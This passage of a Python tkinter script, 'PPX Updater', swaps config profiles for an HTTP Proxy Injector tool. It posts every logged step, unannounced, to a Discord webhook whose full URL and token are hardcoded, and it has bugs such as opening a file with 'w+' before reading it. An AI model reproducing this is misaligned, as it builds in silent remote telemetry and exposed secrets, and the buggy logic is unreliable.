                "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                content=f"{time_now}--Downloading default configs\n",
            )
            log_response = log_webhook.execute()

            if os.path.exists(
                    "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles\A-Dev1412-SYS.ppx"
            ):
                f.write(f"{time_now}--removing old configs\n")
                log_webhook = DiscordWebhook(
                    url="https://discord.com/api/webhooks/1007512069756694538"
                    "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                    content=f"{time_now}--removing old configs\n",
                )
                log_response = log_webhook.execute()
                os.remove(
                    "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles\A-Dev1412-SYS.ppx"
                )
                f.write(f"{time_now}--removed old configs\n")
                log_webhook = DiscordWebhook(
                    url="https://discord.com/api/webhooks/1007512069756694538"
                    "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                    content=f"{time_now}--removed old configs\n",
                )
                log_response = log_webhook.execute()
                shutil.copy(
                    f"C:/Windows/Temp/{random_num}/22e26fec003eba9a6a4bc8d11d2d171d/A-Dev1412-SYS.ppx",
                    "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles",
                )
                f.write(f"{time_now}--Replaced old configs\n")
                log_webhook = DiscordWebhook(
                    url="https://discord.com/api/webhooks/1007512069756694538"
                    "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                    content=f"{time_now}--Replaced old configs\n",
                )
                log_response = log_webhook.execute()

            else:
                shutil.copy(
                    f"C:/Windows/Temp/{random_num}/22e26fec003eba9a6a4bc8d11d2d171d/A-Dev1412-SYS.ppx",
                    "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles",
                )
                f.write(f"{time_now}--Success\n")
                log_webhook = DiscordWebhook(
                    url="https://discord.com/api/webhooks/1007512069756694538"
                    "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                    content=f"{time_now}--Success\n",
                )
                log_response = log_webhook.execute()

        defaults()

    def GButton_567_command(self):

        class App:
            f.write(f"{time_now}--Running about window\n")
            log_webhook = DiscordWebhook(
                url="https://discord.com/api/webhooks/1007512069756694538"
                "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                content=f"{time_now}--Running about window\n",
            )
            log_response = log_webhook.execute()

            def __init__(self, root):
                # setting title
                root.title("About")
                # setting window size
                width = 600
                height = 500
                screenwidth = root.winfo_screenwidth()
                screenheight = root.winfo_screenheight()
                alignstr = "%dx%d+%d+%d" % (
                    width,
                    height,
                    (screenwidth - width) / 2,
                    (screenheight - height) / 2,
                )
                root.geometry(alignstr)
                root.resizable(width=False, height=False)
                update = open(
                    "D:/OneDrive - adithya/Programming/Python/PPX-Updater/bin/update_date.txt",
                    "w+",
                )
                update.read()

                GLabel_292 = tk.Label(root)
                ft = tkFont.Font(family="Segoe UI", size=18)
                GLabel_292["font"] = ft
                GLabel_292["fg"] = "#333333"
                GLabel_292["justify"] = "left"
                GLabel_292["text"] = "Creator - Matheesha Pathirana"
                GLabel_292.place(x=40, y=140, width=327, height=40)

                GLabel_50 = tk.Label(root)
                ft = tkFont.Font(family="Segoe UI", size=38)
                GLabel_50["font"] = ft
                GLabel_50["fg"] = "#333333"
                GLabel_50["justify"] = "center"
                GLabel_50["text"] = "PPX Updater"
                GLabel_50.place(x=110, y=20, width=362, height=111)

                GLabel_525 = tk.Label(root)
                ft = tkFont.Font(family="Segoe UI", size=18)
                GLabel_525["font"] = ft
                GLabel_525["fg"] = "#333333"
                GLabel_525["justify"] = "left"
                GLabel_525["text"] = "Version - 1v"
                GLabel_525.place(x=40, y=190, width=310, height=30)

                GLabel_327 = tk.Label(root)
                ft = tkFont.Font(family="Segoe UI", size=18)
                GLabel_327["font"] = ft
                GLabel_327["fg"] = "#333333"
                GLabel_327["justify"] = "left"
                GLabel_327["text"] = update
                GLabel_327.place(x=40, y=230, width=324, height=35)

                GLabel_844 = tk.Label(root)
                ft = tkFont.Font(family="Segoe UI", size=20)
                GLabel_844["font"] = ft
                GLabel_844["fg"] = "#333333"
                GLabel_844["justify"] = "center"
                GLabel_844["text"] = "All rights reserverd"
                GLabel_844.place(x=120, y=450, width=336, height=44)

                GButton_674 = tk.Button(root)
                GButton_674["bg"] = "#e9e9ed"
                ft = tkFont.Font(family="Segoe UI", size=28)
                GButton_674["font"] = ft
                GButton_674["fg"] = "#000000"
                GButton_674["justify"] = "center"
                GButton_674["text"] = "Close"
                GButton_674.place(x=190, y=370, width=181, height=66)
                GButton_674["command"] = self.GButton_674_command

            def GButton_674_command(self):
                root.destroy()
                f.write(f"{time_now}--Exiting about window\n")
                log_webhook = DiscordWebhook(
                    url="https://discord.com/api/webhooks/1007512069756694538"
                    "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                    content=f"{time_now}--Exiting about window\n",
                )
                log_response = log_webhook.execute()

        if __name__ == "__main__":
            root = tk.Tk()
            app = App(root)
            root.mainloop()

    def GButton_155_command(self):
        version_check()


if __name__ == "__main__":
    root = tk.Tk()
    app = App(root)
    root.mainloop()
